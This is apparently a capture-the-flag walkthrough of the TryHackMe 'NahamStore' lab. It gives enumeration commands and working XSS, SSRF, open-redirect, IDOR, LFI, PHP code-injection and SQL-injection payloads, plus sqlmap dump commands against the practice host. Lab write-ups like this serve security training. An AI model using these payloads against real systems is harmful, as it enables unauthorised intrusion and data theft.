### NahamStore


#### Summary


<!-- MarkdownTOC -->

- [Overview](#overview)
- [Enumeration](#enumeration)
	- [Subdomains](#subdomains)
	- [NMAP Scan](#nmap-scan)
- [Cross-site Scripting](#cross-site-scripting)
- [Open Redirect](#open-redirect)
- [IDOR](#idor)
- [Local File Inclusion](#local-file-inclusion)
- [SSRF](#ssrf)
- [XXE](#xxe)
- [RCE](#rce)
- [SQL Injection](#sql-injection)

<!-- /MarkdownTOC -->



<br><br>

#### Overview

* This is a walk-through of NahamStore TryHackMe room.


<br><br>

#### Enumeration


##### Subdomains


* Set the scope in Burp Suite:

* https://ethicalsumit.medium.com/add-all-subdomains-to-scope-burp-suite-8132a357b09c


```
.*\.nahamstore\.thm$
nahamstore.thm
```


* Initial domain:

```
nahamstore.thm
```

* Virus total disclosed a few subdomains:

```
https://www.virustotal.com/gui/domain/nahamstore.com/relations
```

* These sub-domains need to be added to the /etc/hosts file:

* Remember to change the ".com" to ".thm"

```
bvht73kj.nahamstore.com

awzq0w02.nahamstore.com

12345678.nahamstore.com

stock.nahamstore.com

marketing.nahamstore.com

shop.nahamstore.com

www.nahamstore.com 
```

* The following site disclosed a new sub-domain - https://crt.sh/?q=nahamstore.com

```
nahamstore-2020.nahamstore.com
```

* Sublister did not discover any new subdomains:

```
sublist3r -d nahamstore.com
```

* Using some commands from DNSRecon tool did not disclose anything interesting:

* https://securitytrails.com/blog/dnsrecon-tool


* FFUF

* REMEMBER to use the ".thm" domain.  If you use the ".com" TLD this will not work as we are trying to find subdomains for the IP address we got from THM.

* The scan did not return anything new

```
ffuf -u "http://10.10.164.42" -H "Host: FUZZ.nahamstore.thm" -w "/usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt" -fw 125
```

<br>


* List of all subdomains we have so far:

```
10.10.164.42	nahamstore.thm bvht73kj.nahamstore.thm awzq0w02.nahamstore.thm 12345678.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm shop.nahamstore.thm www.nahamstore.thm nahamstore-2020.nahamstore.thm
```


* The following sub-domains either redirected to http://nahamstore.thm or returned the default message from nahamstore.com:

```
bvht73kj.nahamstore.thm awzq0w02.nahamstore.thm 12345678.nahamstore.thm shop.nahamstore.thm www.nahamstore.thm
```

<br>

##### NMAP Scan

* The nmap scan disclosed 3 ports open: 22, 80, 8000

```
nmap -sC -sV -O 10.10.164.42
```



<br><br>


#### Cross-site Scripting


* The following parameter vulnerable to XSS:

```
http://nahamstore.thm/search?q=test123%27%3B+alert%281%29%3B%2F%2F
```

* Decoded:

```
http://nahamstore.thm/search?q=test123'; alert(1);//
```

* Sink (affected code where the input was relfect in.):

```
<script>
    var search = 'test123'; alert(1);//'; ...
```

<br>

* The following request's User-Agent header was vulnerable to stored XSS, as the next request would reflect it's value unencoded.

```
POST /basket HTTP/1.1
Host: nahamstore.thm
User-Agent: <script>alert(1)</script>
...
address_id=7&card_no=1234123412341234
```


#### Open Redirect


```
ffuf -u "http://nahamstore.thm/?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 4254
```


```
http://nahamstore.thm/?r=https://www.google.com
```


```
POST /account/addressbook?redirect_url=http://10.6.44.219:8000
```



#### IDOR

* CHanging the "adress_id" parameter will return another user's address:

```
POST /basket HTTP/1.1
Host: nahamstore.thm
...

address_id=4
```

<br>

* The original requets only contained the "what" and "id" parameters that indicate our order number.  Changing the "id" parameter value and rendering the request in the browser will return an error message "Order does not belong to this user_id".

* Simply including the "user_id" field was not working the "&" character needed to be URL encoded, and then render the request/response in the browser.

```
POST /pdf-generator HTTP/1.1
Host: nahamstore.thm
...

what=order&id=3%26user_id=3
```


#### Local File Inclusion

```
ffuf -u "http://nahamstore.thm/product/picture/?file=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 19
```

```
http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//lfi/flag.txt
```


#### SSRF

* SSRF vulnerability was identified in the following request:


```
POST /stockcheck HTTP/1.1
Host: nahamstore.thm
...
product_id=2&server=stock.nahamstore.thm@10.6.44.219:8000#
```



#### XXE

* This endpoint has a functionality vulnerable to XXE:

* http://nahamstore.thm/staff






#### RCE


```
ffuf -u "http://nahamstore.thm:8000/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

* Default credentials worked - admin/admin

```
http://nahamstore.thm:8000/admin
```

* Here were are able to edit a market campaign details, there is an input box called "code" with some HTML content, add PHP code and see if it gets executed:

```
<?php echo "hi"; ?>
```


* Browse to the following sub-domain and view the updated campaign, and the code was excuted:

```
http://marketing.nahamstore.thm/
```


<br><br><br>

#### SQL Injection


* SQL Injection was found under this endpoint:

* Use SQLmap to dump the tables:

```
sqlmap -u "http://nahamstore.thm/product?id=2" --batch --dump
```

<br>

* Blind SQL Injection was found here:

```
POST /returns HTTP/1.1
Host: nahamstore.thm

-----------------------------314950343633128084192905981754
Content-Disposition: form-data; name="order_number"

1; select sleep (10)--
-----------------------------314950343633128084192905981754
```

* Another payloads that worked to identify the vulnerability was:

* The response retuned between these payloads was very different:

```
1 or 1=test--
```

```
1 or 1=1--
```

* Save the entire POST request to a .txt file so we can send it to SQLMap:

* Include a \* within the value of the vulnerable parameter:

```
POST /returns HTTP/1.1
Host: nahamstore.thm

-----------------------------314950343633128084192905981754
Content-Disposition: form-data; name="order_number"

1*
-----------------------------314950343633128084192905981754
```

